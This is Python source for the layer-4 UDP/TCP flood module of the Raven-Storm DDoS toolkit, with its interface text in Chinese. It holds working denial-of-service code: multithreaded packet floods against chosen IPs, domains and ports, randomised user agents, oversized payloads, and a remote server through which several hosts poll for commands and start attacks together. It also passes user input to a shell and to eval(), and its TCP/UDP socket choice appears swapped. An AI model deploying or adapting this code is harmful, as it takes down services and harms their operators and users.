# 2020
# The Raven-Storm Toolkit was programmed and developed by Taguar258.
# The Raven-Storm Toolkit is published under the MIT Licence.
# The Raven-Storm Toolkit is based on the CLIF-Framework.
# The CLIF-Framework is programmed and developed by Taguar258.
# The CLIF-Framework is published under the MIT Licence.

import socket
from os import getcwd, name, path, system
from random import choice
from sys import version
from threading import Thread
from time import sleep, time

import requests
from CLIF_Framework.framework import event, tools  # noqa: I900

event = event()
tools = tools()


class Main:
	def __init__(selfie, console):  # noqa: N805
		global self
		global var
		self = selfie
		var = console  # noqa: VNE002

		self._add_commands()

		# Colors
		var.C_None = "\x1b[0;39m"
		var.C_Bold = "\x1b[1;39m"
		var.C_Green = "\x1b[32m"
		var.C_Violet = "\x1b[34m"
		var.C_Dark_Blue = "\x1b[35m"
		var.C_Red = "\x1b[31m"

		var.port = [80]  # Port 80 protocol == TCP
		var.threads = 160
		var.ip = [""]
		var.socketmethod = "TCP"  # / UDP
		var.sleep = 0
		var.outtxt = True
		var.outtxtmute = False
		var.message = "hey, it's me rs."
		var.messagezw = var.message
		var.rtxt = 1
		var.stress = False
		var.timeforstress = 1
		var.autostart = 0
		var.autostop = 0
		var.autostep = 0
		var.autostarttime = 0  # Will be used as a variable for autostop
		var.runactive = True
		var.get_url = ""

		var.l4_debug = False
		var.stoped_threads = 0

		var.user_agents = ["Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)", "Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; pl-pl) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0", "Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; nb-no) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246", "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))", "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00", "Opera/9.80 (Windows NT 6.1; U; ko) Presto/2.7.62 Version/11.00", "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36", "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; ru; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; en-gb) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)", "Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0", "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)", "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01", "Mozilla/5.0 (iPhone; U; fr; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; ru-ru) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; zh-tw) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5"]

	def _add_commands(self):
		event.commands(self.exit_console, ["exit", "quit", "e", "q"])
		event.command(self.help)

		event.commands(self.run_shell, ".")
		event.commands(self.debug, "$")

		event.commands(self.show_values, ["values", "ls"])

		event.help_comment("|\n|-- Main commands:")
		event.help("port", "设置目标端口。")
		event.help("threads", "设置线程数。")
		event.help("ip", "设置目标 IP。")
		event.help("web", "设置域名对应的 IP。")
		event.help("method", "在 UDP 和 TCP 之间切换攻击方法。")
		event.help("sleep", "设置每个数据包发送之间的时间延迟。")
		event.help("outtxt", "输出每个数据包发送状态：启用/禁用。")
		event.help("mute", "不输出连接回复。")
		event.help(["values", "ls"], "显示所有已选择的选项。")
		event.help("run", "开始攻击。")
		event.help_comment("|\n|-- Set Send-text:")
		event.help("message", "设置数据包消息。")
		event.help("repeat", "重复目标消息指定次数。")
		event.help("mb", "向服务器发送指定大小的 MB 数据包。")
		event.help("get", "定义 GET Header。")
		event.help("agent", "定义一个用户代理，代替随机代理。")
		event.help_comment("|\n|-- Stress Testing:")
		event.help("stress", "启用压力测试模式。")
		event.help("st wait", "设置每个压力级别之间的时间。")
		event.help_comment("|\n|-- Multiple:")
		event.help("ips", "设置多个目标 IP。")
		event.help("webs", "设置多个目标域。")
		event.help("ports", "攻击多个端口。")
		event.help_comment("|\n|-- Automation:")
		event.help("auto start", "设置攻击开始前的延迟。")
		event.help("auto step", "设置下一线程激活之间的延迟。")
		event.help("auto stop", "设置攻击停止后的延迟。")

	def banner(self):
		system("clear || cls")
		print(("""C_B----------------------------------------------------------C_W
THE CREATOR DOES NOT TAKE ANY RESPONSIBILITY FOR DAMAGE CAUSED.
THE USER ALONE IS RESPONSIBLE, BE IT: ABUSING RAVEN-STORM
TO FIT ILLEGAL PURPOSES OR ACCIDENTAL DAMAGE CAUSED BY RAVEN-STORM.
BY USING THIS SOFTWARE, YOU MUST AGREE TO TAKE FULL RESPONSIBILITY
FOR ANY DAMAGE CAUSED BY RAVEN-STORM.
EVERY ATTACK WILL CAUSE TEMPORARY DAMAGE, BUT LONG-TERM DAMAGE IS
DEFFINITIFLY POSSIBLE.
RAVEN-STORM SHOULD NOT SUGGEST PEOPLE TO PERFORM ILLEGAL ACTIVITIES.
C_B----------------------------------------------------------C_W""").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
		self.help()

	def exit_console(self):
		print("祝您愉快。")
		quit()

	def run_shell(self, command):
		print("")
		system(tools.arg("输入 shell 命令：", ". ", command))
		print("")

	def debug(self, command):
		print("")
		eval(tools.arg("输入调试命令：", "$ ", command))
		print("")

	@event.command
	def clear():
		system("clear || cls")

	@event.event
	def on_ready():
		self.banner()

	@event.event
	def on_command_not_found(command):
		print("")
		print("您输入的命令不存在。")
		print("")

	def check_session(self):
		if var.session[1][0] and len(var.session[1][1]) >= 1:
			if len(var.session[1][1][0]) >= 1:
				run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
				var.session[1][1][0] = var.session[1][1][0][1:]
			else:
				var.session[1][1] = var.session[1][1][1:]
				run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
				var.session[1][1][0] = var.session[1][1][0][1:]
			var.run_command = run_following

	@event.event
	def on_input():
		self.check_session()
		if var.server[0] and not var.server[1]:
			while True:
				data = requests.post((var.server[2] + ("get/com%s" % var.server[4])), data={"password": var.server[3]}).text
				if data != "500":
					var.server[4] = var.server[4] + 1
					var.run_command = [data, data]
					print(var.ps1 + "\r")
					break
				else:
					sleep(1)

	@event.event
	def on_interrupt():
		print("")
		var.stop()

	@event.event
	def on_command(command):
		if var.session[0][0]:
			var.session[0][1].write(command + "\n")
		if var.server[0] and var.server[1]:
			status = requests.post((var.server[2] + "set/com"), data={"password": var.server[3], "data": command}).text
			if status != "200":
				print("")
				print("向服务器发送命令时发生错误。")
				print("")

	@event.command
	def debug():
		var.l4_debug = True
		print("")
		print("调试模式已启用。")
		print("")

	def help(self):
		event.help_title("\x1b[1;39mUDP/TCP Flood Help:\x1b[0;39m")
		tools.help("|   |-- ", " :: ", event)
		print("")

	@event.command
	def port(command):
		print("")
		try:
			var.port = [int(tools.arg("端口：", "port ", command))]
		except Exception as e:
			print("There was an error while executing.", e)
		print("")

	@event.command
	def threads(command):
		print("")
		try:
			var.threads = int(tools.arg("线程：", "threads ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print("")

	@event.command
	def ip(command):
		print("")
		var.ip = [tools.arg("目标：", "ip ", command)]
		if "." not in var.ip[0]:
			print("该 IP 不存在。")
		print("")

	@event.command
	def web(command):
		print(" ")
		try:
			webtoip = tools.arg("网站：", "web ", command)
			webtoip = webtoip.replace("http://", "")
			webtoip = webtoip.replace("https://", "")
			webtoiptxt = str(socket.gethostbyname(webtoip))
			var.ip = [webtoiptxt]
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def method(command):
		print("")
		if var.socketmethod == "TCP":
			var.socketmethod = "UDP"
			print("方法已切换为 UDP。")
		else:
			var.socketmethod = "TCP"
			print("方法已切换为 TCP。")
		print("")

	@event.command
	def sleep(command):
		print("")
		try:
			var.sleep = int(tools.arg("延迟（秒）：", "sleep ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print("")

	@event.command
	def outtxt(command):
		print(" ")
		if var.outtxt:
			print("输出已减少。")
			var.outtxt = False
		else:
			print("输出已恢复正常。")
			var.outtxt = True
		print(" ")

	@event.command
	def mute(command):
		print(" ")
		if var.outtxtmute:
			print("输出已禁用。")
			var.outtxtmute = False
		else:
			print("输出已启用。")
			var.outtxtmute = True
		print(" ")

	@event.command
	def message(command):
		print("")
		var.message = tools.arg("消息：", "message ", command)
		var.rtxt = 1
		print("")

	@event.command
	def get(command):
		print("")
		var.get_url = tools.arg("GET Header：", "get ", command)
		print("")

	@event.command
	def repeat(command):
		print(" ")
		try:
			rtxtzw = var.rtxt
			var.rtxt = int(tools.arg("重复消息次数：", "repeat ", command))
			if var.rtxt < 1:
				print("There was an error while executing.")
			else:
				if rtxtzw < var.rtxt:
					var.messagezw = var.message
					var.message = (str(var.message) * int(var.rtxt))
				else:
					var.message = (str(var.messagezw) * int(var.rtxt))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def mb(command):
		print(" ")
		try:
			setmb = int(tools.arg("数据包大小（MB）：", "mb ", command))
			setmb = int(setmb / 0.000001)
			var.message = ("r" * setmb)
			var.rtxt = setmb
			var.messagezw = "r"
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def stress(command):
		print(" ")
		if var.stress:
			print("压力测试模式已禁用。")
			var.stress = False
		else:
			print("压力测试模式已启用。")
			var.stress = True
		print(" ")

	@event.command
	def st_wait(command):
		print("")
		try:
			var.timeforstress = int(tools.arg("延迟（秒）：", "st wait ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print("")

	@event.command
	def ips(command):
		print("")
		var.ip = tools.arg("目标（用 ', ' 分隔）：", "ips ", command).split(", ")
		for ip in var.target:
			if "." not in ip:
				print("该 IP 不存在。")
		print("")

	@event.command
	def ports(command):
		print("")
		try:
			var.port = tools.arg("端口（用 ', ' 分隔）：", "ports ", command).split(", ")
			for port in var.port:
				if isinstance(port, int):
					print("Entered ports cannot be used.")
		except Exception as e:
			print("There was an error while executing.", e)
		print("")

	@event.command
	def webs(command):
		print(" ")
		try:
			webtoip = tools.arg("网站（用 ', ' 分隔）：", "webs ", command).split(", ")
			for pos, web in enumerate(webtoip):
				webtoip[pos] = web.replace("http://", "")
				webtoip[pos] = webtoip[pos].replace("https://", "")
				webtoip[pos] = str(socket.gethostbyname(webtoip[pos]))
			var.ip = webtoip
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def auto_step(command):
		print(" ")
		try:
			var.autostep = int(tools.arg("下一线程激活延迟（秒）：", "auto step ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def auto_start(command):
		print(" ")
		try:
			var.autostart = int(tools.arg("攻击开始延迟（秒）：", "auto start ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def auto_stop(command):
		print(" ")
		try:
			var.autostop = int(tools.arg("在 x 秒后停止攻击：", "auto stop ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def agent(command):
		print(" ")
		var.user_agents = [tools.arg("输入用户代理：", "agent ", command)]
		print(" ")

	def show_values(self):
		print("")
		print("Ports: %s" % var.port)
		print("线程：%s" % var.threads)
		print("Targets: %s" % var.ip)
		print("Method: %s" % var.socketmethod)
		print("Time between each packet: %s" % var.sleep)
		print("Output: %s" % var.outtxt)
		print("Muted: %s" % var.outtxtmute)
		print("数据包消息：%s" % var.message[:15])
		print("Repeat packet text: %s" % var.rtxt)
		print("Stress-Test mode: %s" % var.stress)
		print("Stress-Test level duration: %s" % var.timeforstress)
		print("Start Delay: %s" % var.autostart)
		print("Stop after x seconds: %s" % var.autostop)
		print("线程间时间：%s" % var.autostep)
		if len(var.user_agents) == 1:
			print("User Agent: %s" % var.user_agents[0])
		if var.get_url != "":
			print("GET Header：%s" % var.get_url)
		print("")

	def stresstest(self):
		print(" ")
		print("Time between: %s" % str(var.timeforstress))
		print("Using %s threads per round" % str(var.threads))
		print("To stop the attack press: CTRL + C")
		print(" ")
		sleep(2)
		while True:
			for thread in range(var.threads):
				try:
					t = Thread(target=self.ddos)
					t.start()
				except Exception:
					print("\x1b[0;39mFailed to start a thread.")
			sleep(var.timeforstress)
			if var.stresserror:
				print(" ")
				print("Stopped at %s threads!" % (str(var.stresstestvar * var.threads)))
				print(" ")
				var.runactive = False
				quit()
			else:
				var.stresstestvar += 1

	def ddos(self):
		mesalready = False
		if var.get_url == "":
			var.get_url = var.ip
		packet = ("GET /%s HTTP/1.1\r\nHost: %s\r\n User-Agent: %s\r\nConnection: Keep-Alive\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\n%s\r\n\r\n" % (var.get_url, var.ip, choice(var.user_agents), var.message)).encode("utf-8")
		if not var.outtxtmute:
			print("Thread started!")
		if var.socketmethod == "UDP":
			mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		else:
			mysocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		while var.runactive:
			for ipvalue in var.ip:
				for portvalue in var.port:
					try:
						if var.socketmethod == "TCP":
							mysocket.connect((ipvalue, portvalue))
						else:
							try:
								mysocket.bind((ipvalue, portvalue))
							except Exception:
								pass
						if var.socketmethod == "TCP":
							mysocket.send(packet)
						try:
							mysocket.sendto(packet, (ipvalue, portvalue))
						except Exception:
							mysocket.send(packet)
						if var.outtxt:
							if not mesalready:
								mesalready = True
								print("\n%s 端口 %s 请求成功！" % (ipvalue, portvalue))
						# sleep(sleepy)
						var.command_log.append("Sucessful execution.")
					except socket.error as ex:
						if not var.outtxtmute:
							mesalready = False
							print("\n%s 端口 %s 未接受请求！" % (ipvalue, portvalue))
						var.command_log.append("ERROR: %s" % ex)
						if var.l4_debug:
							print("ERROR: %s" % ex)
						if var.stress:
							var.stresserror = True
						if var.socketmethod == "TCP":
							try:
								mysocket.close()
							except Exception:
								pass

			if int(var.autostop) != 0:
				autoendtime = time()
				autotimer = (int(autoendtime) - int(var.autostarttime))
				if var.autostop <= autotimer:
					print("\x1b[0;39m自动停止")
					var.runactive = False
					quit()
		var.stoped_threads += 1

	@event.command
	def run(command):
		print("")
		if var.ip != "":
			def execute():
				print("")
				print("停止攻击请按：ENTER 或 CTRL + C")
				sleep(3)
				sleep(var.autostart)
				if var.stress:
					if len(var.target) == 1 and len(var.port) == 1:
						self.stresstest()
					else:
						print("在压力测试模式下请不要使用多个目标/端口。")
				else:  # Normal Mode
					if var.autostop != 0:
						var.autostarttime = time()
					for thread in range(var.threads):
						try:
							t = Thread(target=self.ddos)
							sleep(var.autostep)
							t.start()
						except Exception:
							print("无法启动线程 %s。" % thread)

				def reset_attack():
					print("正在停止线程...")
					var.runactive = False
					sleep(2)
					while True:
						if var.stoped_threads == var.threads:
							break
						else:
							sleep(1)

					if var.l4_debug:
						print("正在保存调试日志...")
						output_to = path.join(getcwd(), "l4_debug_log.txt")

						write_method = "a"
						if path.isfile(output_to):
							write_method = "a"
						else:
							write_method = "w"

						output_file = open(output_to, write_method)
						if write_method == "a":
							output_file.write("------------- New Log -------------")
						output_file.write(str(name + "\n"))
						output_file.write(str(version + "\n"))
						output_file.write(str("\n".join(var.command_log)))
						output_file.close()
					print("完成。")
					quit()

				def check_stopped_execution():
					while True:
						data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
						if data != "True":
							reset_attack()
							break
						else:
							sleep(1)
				try:
					if var.server[0] and var.server[0]:
						rec_t = Thread(target=check_stopped_execution)
						rec_t.start()
					input("\r")
				except KeyboardInterrupt:
					pass

				if var.server[0] and var.server[1]:
					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
					if status != "200":
						print("An error occured, while sending data to the server.")

				reset_attack()

			if var.server[0] and not var.server[1]:
				while True:
					data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
					if data == "True":
						execute()
						break
					else:
						sleep(1)
			elif not tools.question("\n您是否同意使用条款？"):
				print("未接受协议。")
				quit()
			else:
				if var.server[0] and var.server[1]:
					if tools.question("\n是否希望将该主机用作 DDoS 的一部分？"):
						status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
						if status != "200":
							print("An error occured, while sending data to the server.")
						execute()
					else:
						status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
						if status != "200":
							print("An error occured, while sending data to the server.")
						try:
							print("[按回车停止攻击。]")
						except KeyboardInterrupt:
							pass
						status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
						if status != "200":
							print("An error occured, while sending data to the server.")
				else:
					execute()
		else:
			print("No target has been defined.")
		print("")


def setup(console):
	console.ps1 = "L4> "
	console.add(Main(console), event)
